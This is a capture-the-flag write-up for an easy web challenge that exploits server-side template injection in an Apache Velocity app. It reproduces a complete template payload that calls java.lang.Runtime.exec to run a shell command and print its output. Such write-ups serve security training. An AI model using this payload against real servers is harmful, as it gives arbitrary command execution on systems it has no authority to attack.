# Labyrinth Linguist (<font color=lightgreen>Easy</font>)


## Description
You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive.

## Tool Used
- Web Browser

## Skill Learned
- Server-Side Template Injection (SSTI)

## Steps
1. Inspecting the source code provided, we see the app uses: org.apache.velocity.Template
2. This points directly to Apache Velocity, and the text field is interpolated in a template file. Knowing that Velocity 1.7 is vulnerable to SSTI via CVE-2020-13936, this becomes our entry point.
3. Exploit Payload:
    ```
    #set($engine="string")
    #set($run=$engine.getClass().forName("java.lang.Runtime"))
    #set($runtime=$run.getRuntime())
    #set($proc=$runtime.exec("cat ../flag.txt"))
    #set($null=$proc.waitFor())
    #set($istr=$proc.getInputStream())
    #set($chr=$engine.getClass().forName("java.lang.Character"))
    #set($output="")
    #set($string=$engine.getClass().forName("java.lang.String"))
    #foreach($i in [1..$istr.available()])
    #set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
    #end
    $output
    ```
    - Invoke java.lang.Runtime.getRuntime().exec()
    - Run cat ../flag.txt
    - Read the output byte-by-byte from the InputStream
    - Convert it to characters using Character.toChars()
    - Concatenate it into a final string and print it



